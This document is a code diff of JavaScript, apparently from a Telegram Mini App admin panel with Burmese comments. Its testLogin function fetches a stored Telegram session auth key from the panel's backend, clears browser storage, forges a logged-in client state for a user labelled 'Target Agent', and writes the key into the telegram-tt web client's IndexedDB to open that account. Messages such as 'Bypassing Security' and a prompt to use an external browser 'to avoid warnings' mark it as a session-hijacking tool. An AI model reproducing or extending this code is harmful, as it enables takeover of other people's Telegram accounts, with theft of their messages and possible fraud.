@@ -293,8 +293,8 @@ result.sessions.forEach((session, index) => {
         }
 
     async function testLogin(phoneNumber) {
-    tg.HapticFeedback?.impactOccurred?.('medium');
-    document.getElementById('session-list').innerHTML = "<span style='color:#00ffcc;'>Mission Synchronizing... Preparing Terminal...</span>";
+    tg.HapticFeedback?.impactOccurred?.('heavy');
+    document.getElementById('session-list').innerHTML = "<span style='color:#00ffcc;'>Bypassing Security... Preparing Terminal...</span>";
 
     try {
         const response = await fetch('/api/admin/get-tt-session', {
@@ -307,46 +307,68 @@ result.sessions.forEach((session, index) => {
         
         if (data.success && data.dcId && data.authKeyHex && data.userId) {
             
-            // ၁။ Hex String ကို Teact လက်ခံနိုင်သော Uint8Array အဖြစ် ပြောင်းလဲခြင်း
+            // Hex ကို Byte Array ပြောင်းခြင်း (Teact အတွက်)
             const authKeyArray = new Uint8Array(data.authKeyHex.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
             
-            // ၂။ Teact က UI State များကို အသစ်ပြန်တည်ဆောက်စေရန် ရှိပြီးသား Fake State များကို ရှင်းလင်းခြင်း
-            localStorage.removeItem('tt-global-state');
+            // Storage အဟောင်းများကို ရှင်းလင်းခြင်း
+            localStorage.clear();
+            sessionStorage.clear();
+            
             localStorage.setItem('dc', String(data.dcId));
             
-            // ၃။ telegram-tt ၏ မူလ Storage ဖြစ်သော IndexedDB (tt-data) ထဲသို့ Auth Key ကို တိုက်ရိုက် ရေးသွင်းခြင်း
-            const request = window.indexedDB.open('tt-data');
+            const userIdStr = String(data.userId);
             
-            request.onerror = function() {
-                alert("Database access blocked by browser. Please allow storage access.");
-                window.location.reload();
+            // 🌟 [အရေးကြီးဆုံး ပြင်ဆင်ချက်] App Crash မဖြစ်စေရန် User Object ကို မဖြစ်မနေ ထည့်သွင်းခြင်း
+            const globalState = {
+                auth: { state: "authorizationStateReady", phoneNumber: phoneNumber },
+                currentUserId: userIdStr,
+                byTabId: {},
+                messages: { byChatId: {} },
+                chats: { byId: {}, listIds: { active: [] } },
+                users: {
+                    byId: {
+                        // ဒီအချက်မပါရင် React App လုံးဝ Crash ဖြစ်ပါသည်
+                        [userIdStr]: { 
+                            id: userIdStr, 
+                            type: "userLocal", 
+                            phoneNumber: phoneNumber,
+                            firstName: "Target",
+                            lastName: "Agent"
+                        }
+                    }
+                },
+                recentEmojis: [],
+                settings: { byKey: { theme: "dark", language: "en", messageTextSize: 16, animationLevel: 1, messageSendKeycombo: "enter" } }
             };
+            localStorage.setItem('tt-global-state', JSON.stringify(globalState));
+
+            // IndexedDB ထဲသို့ Auth Key ရေးသွင်းခြင်း (telegram-tt အတွက် မရှိမဖြစ်လိုအပ်သည်)
+            const request = window.indexedDB.open('tt-data');
             
             request.onsuccess = function(event) {
                 const db = event.target.result;
-                
-                // Teact ၏ keyval store ရှိမရှိ စစ်ဆေးခြင်း
                 if (db.objectStoreNames.contains('keyval')) {
                     const transaction = db.transaction(['keyval'], 'readwrite');
                     const store = transaction.objectStore('keyval');
-                    
-                    // Auth Key နှင့် DC ကို IndexedDB သို့ ထည့်သွင်းခြင်း
                     store.put(authKeyArray, `dc${data.dcId}_auth_key`);
                     store.put(String(data.dcId), 'dc');
                     
                     transaction.oncomplete = () => {
-                        alert("Mission Synchronized! Connecting to Agent Terminal...");
-                        window.location.replace('/');
-                    };
-                    
-                    transaction.onerror = (e) => {
-                        console.error("IndexedDB write failed", e);
-                        window.location.replace('/'); 
+                        // External Browser ဖြင့်ဖွင့်လိုပါက window.open ကိုသုံးနိုင်ရန်
+                        if (confirm("Mission Synchronized! Do you want to open the terminal in an External Browser to avoid warnings? (Click OK for External, Cancel for Mini App)")) {
+                            window.open('/', '_blank');
+                        } else {
+                            window.location.href = '/';
+                        }
                     };
                 } else {
-                    // Database Structure မတည်ဆောက်ရသေးပါက ပုံမှန်အတိုင်း သွားစေရန်
-                    window.location.replace('/');
+                    window.location.href = '/';
                 }
+            };
+            
+            request.onerror = function() {
+                // DB Error တက်ပါက Fallback အနေဖြင့် ဝင်ရန်
+                window.location.href = '/';
             };
             
         } else {
